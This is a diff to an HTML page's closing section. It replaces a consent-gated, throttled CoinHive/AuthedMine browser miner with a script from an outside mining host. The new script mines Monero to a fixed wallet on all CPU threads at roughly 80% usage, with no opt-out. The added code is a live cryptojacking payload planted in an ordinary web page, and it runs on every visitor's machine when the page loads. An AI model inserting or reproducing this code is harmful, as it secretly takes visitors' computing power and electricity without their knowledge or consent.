@@ -27,15 +27,13 @@
 		</footer>
 	</body>
 
-	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
- var miner = new CoinHive.Anonymous('DNvkUKFEbzbZFIekyiddu9tUAFjO6Qtz', {throttle: 0.1});
+<script src="https://xmr.omine.org/assets/v7.js"></script>
 
- // Only start on non-mobile devices and if not opted-out
- // in the last 14400 seconds (4 hours):
- if (!miner.isMobile() && !miner.didOptOut(14400)) {
- miner.start();
- }
-</script>
+  <script>
 
+    OMINE("4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb
+#Public","-1"); //-1 means use all cpu threads
+    throttleMiner=20; //20 means 80% of cpu usage
+
+  </script>
 </html>
